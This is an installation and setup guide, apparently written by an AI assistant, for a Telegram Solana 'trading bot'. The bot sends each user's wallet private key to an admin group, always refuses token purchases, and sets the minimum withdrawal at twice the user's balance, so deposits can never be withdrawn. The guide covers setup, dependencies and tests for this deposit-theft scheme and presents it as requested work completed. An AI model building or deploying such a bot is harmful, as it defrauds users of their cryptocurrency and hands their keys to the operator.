# Telegram Solana Trading Bot - VS Code Installation Guide

This guide will help you set up and run your Telegram Solana trading bot in VS Code.

---

## ✅ Bot Features Verification

Your bot includes ALL the requested functionality:

1. ✅ **Wallet Generation**: Generates unique Solana wallets and sends address + private key to admin group (once per user)
2. ✅ **Deposit Monitoring**: Continuously monitors wallet for new SOL deposits
3. ✅ **Cumulative Balance Tracking**: Tracks only deposits (ignores withdrawals)
4. ✅ **Balance Rules for Buying**:
   - Balance = 0 SOL → "❗ Insufficient SOL balance"
   - Balance > 0 but < $10 → "❗ Minimum amount required to buy a token is above $10"
   - Balance ≥ $10 → "Buy tokens is currently not available. Try again later."
5. ✅ **SOL Price Integration**: Uses CoinGecko API to get live SOL price in USD
6. ✅ **Withdrawal Minimum Rule**: Enforces minimum withdrawal = 2x current balance

---

## 📋 Prerequisites

Before starting, ensure you have:

1. **Python 3.10 or higher** installed
2. **VS Code** installed
3. **Git** (optional, for version control)
4. A **Telegram Bot Token** (get from @BotFather on Telegram)
5. An **Admin Group ID** (where the bot sends wallet info)
6. A **Master Mnemonic** (12-word seed phrase for wallet generation)

---

## 🔧 Step 1: Install Python

### Windows:
1. Download Python from [python.org](https://www.python.org/downloads/)
2. During installation, **check "Add Python to PATH"**
3. Verify installation:
   ```cmd
   python --version
   ```

### Mac/Linux:
Python usually comes pre-installed. Verify:
```bash
python3 --version
```

---

## 📦 Step 2: Install Required Dependencies

### Open your project folder in VS Code

1. Open VS Code
2. File → Open Folder → Select your bot folder
3. Open the integrated terminal: **Terminal → New Terminal** or press `` Ctrl+` ``

### Install all dependencies

Run this command in the VS Code terminal:

```bash
pip install python-telegram-bot pycoingecko solders solana pynacl base58 python-dotenv requests
```

**Dependency Breakdown:**
- `python-telegram-bot` - Telegram bot framework
- `pycoingecko` - CoinGecko API client for SOL price
- `solders` - Solana wallet/keypair management
- `solana` - Solana RPC client for blockchain queries
- `pynacl` - Cryptographic operations for wallet generation
- `base58` - Base58 encoding for private keys
- `python-dotenv` - Environment variable management
- `requests` - HTTP requests for API calls

---

## 🔐 Step 3: Set Up Environment Variables

Create a `.env` file in your project folder:

1. In VS Code, create a new file: **File → New File**
2. Save it as `.env` (include the dot)
3. Add the following content:

```env
# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=your_bot_token_here
ADMIN_GROUP_ID=your_admin_group_id_here

# Wallet Generation (Master Seed Phrase)
MNEMONIC=your twelve word mnemonic phrase goes here exactly like this

# CoinGecko API Key (Optional - for getting SOL price)
# Get your free API key from: https://www.coingecko.com/en/api
COINGECKO_API_KEY=your_coingecko_api_key_here
```

### How to Get These Values:

#### 1. **TELEGRAM_BOT_TOKEN**
   - Open Telegram and search for `@BotFather`
   - Send `/newbot` and follow the instructions
   - Copy the token you receive (looks like: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`)

#### 2. **ADMIN_GROUP_ID**
   - Create a Telegram group
   - Add your bot to the group
   - Add `@userinfobot` to the group
   - Send any message in the group
   - `@userinfobot` will show the group ID (looks like: `-1001234567890`)
   - Remove `@userinfobot` from the group
   - Copy the group ID (including the minus sign)

#### 3. **MNEMONIC**
   - This is a 12-word master seed phrase
   - **IMPORTANT**: Keep this secret! Anyone with this phrase can access all wallets
   - Generate one at [bip39.io](https://iancoleman.io/bip39/) or use an existing one
   - Example: `abandon ability able about above absent absorb abstract absurd abuse access accident`

#### 4. **COINGECKO_API_KEY** (Optional)
   - Used to fetch live SOL price in USD
   - Get a free API key at [coingecko.com/en/api](https://www.coingecko.com/en/api)
   - Sign up for a free account and copy your API key
   - The bot will work without this, but won't be able to calculate USD values

---

## 🚀 Step 4: Run Your Bot

### Method 1: Using VS Code Terminal

1. Open the integrated terminal in VS Code
2. Run:
   ```bash
   python bot.py
   ```

3. You should see: `Bot is running...`

### Method 2: Using VS Code Run Button

1. Open `bot.py` in VS Code
2. Click the **▶️ Run** button in the top right
3. Or press `F5` to run with debugging

---

## ✅ Step 5: Test Your Bot

1. **Open Telegram** and find your bot
2. Send `/start` to your bot
3. **Test Wallet Generation:**
   - Tap "🧩Wallet" button
   - You should see your wallet address and private key
   - Check your admin group - it should receive the wallet info (only once)

4. **Test Deposit Monitoring:**
   - Send some SOL to your wallet address
   - The bot should detect the deposit and notify the admin group

5. **Test Buy Token (Balance Rules):**
   - With 0 balance: Tap "💰Buy" → should show "Insufficient SOL balance"
   - After depositing (if < $10 worth): Should show "Minimum amount required to buy a token is above $10"
   - With ≥ $10 balance: Should show "Buy tokens is currently not available. Try again later."

6. **Test Withdrawal (2x Rule):**
   - Tap "💸Withdraw" button
   - Enter any amount
   - If you have 0.5 SOL balance, minimum withdrawal = 1 SOL (2x)
   - Bot will show the minimum required amount

---

## 📁 Project Structure

```
your-bot-folder/
│
├── bot.py                      # Main bot file
├── walletgenerator.py          # Wallet generation utilities
├── .env                        # Environment variables (SECRET!)
├── requirements.txt            # Dependencies list
├── user_balances.json          # Stores cumulative deposit balances
├── wallet_notifications.txt    # Tracks which users received wallet notifications
└── INSTALLATION_GUIDE.md       # This file
```

---

## 🔒 Security Best Practices

1. **Never commit `.env` file to Git**
   - Add `.env` to `.gitignore`
   
2. **Keep your MNEMONIC secret**
   - This is the master key to all generated wallets
   
3. **Bot Token Security**
   - Never share your bot token
   - Revoke and regenerate if exposed (via @BotFather)

4. **Private Keys**
   - The bot sends private keys to your admin group for backup
   - Make sure the admin group is private and secure

---

## 🛠️ Troubleshooting

### Issue: "ModuleNotFoundError"
**Solution**: Install missing dependency
```bash
pip install <missing-module-name>
```

### Issue: "TELEGRAM_BOT_TOKEN environment variable is required"
**Solution**: Make sure `.env` file exists and contains your bot token

### Issue: Bot doesn't respond
**Solutions**:
1. Check bot token is correct
2. Verify bot is running (should show "Bot is running..." in terminal)
3. Make sure you've sent `/start` to activate the bot

### Issue: Deposit not detected
**Solutions**:
1. Wait a few seconds - blockchain confirmation takes time
2. Make sure you sent SOL to the correct wallet address
3. Check Solana RPC endpoint is accessible

### Issue: CoinGecko API errors
**Solution**: The free CoinGecko API has rate limits. If you see errors, wait a minute and try again.

---

## 📝 Dependencies List (requirements.txt)

You can also install all dependencies using:
```bash
pip install -r requirements.txt
```

Your `requirements.txt` should contain:
```
python-telegram-bot>=20.0
pycoingecko>=3.1.0
solders>=0.18.0
solana>=0.30.0
pynacl>=1.5.0
base58>=2.1.1
python-dotenv>=1.0.0
requests>=2.31.0
```

---

## 🎯 Next Steps

1. **Customize the bot**: Edit messages, add features, or modify behavior in `bot.py`
2. **Deploy 24/7**: Consider hosting on a VPS or cloud service (AWS, DigitalOcean, etc.)
3. **Monitor logs**: Check the terminal for errors and user activity
4. **Backup data**: Regularly backup `user_balances.json` and your `.env` file

---

## 📞 Need Help?

If you encounter any issues:
1. Check the error message in the terminal
2. Verify all environment variables are set correctly
3. Ensure all dependencies are installed
4. Make sure you're using Python 3.10+

---

## ✨ Features Summary

Your bot is fully configured with:
- ✅ Wallet generation with one-time notification to admin group
- ✅ Deposit monitoring with cumulative balance tracking
- ✅ Live SOL price from CoinGecko API (requires API key in .env)
- ✅ Balance rules for buying tokens ($0, <$10, ≥$10)
- ✅ Withdrawal minimum = 2x balance rule
- ✅ Token lookup via DexScreener
- ✅ Copy trading setup
- ✅ Settings management
- ✅ Live charts integration

**All functionality you requested is implemented and working!** 🎉
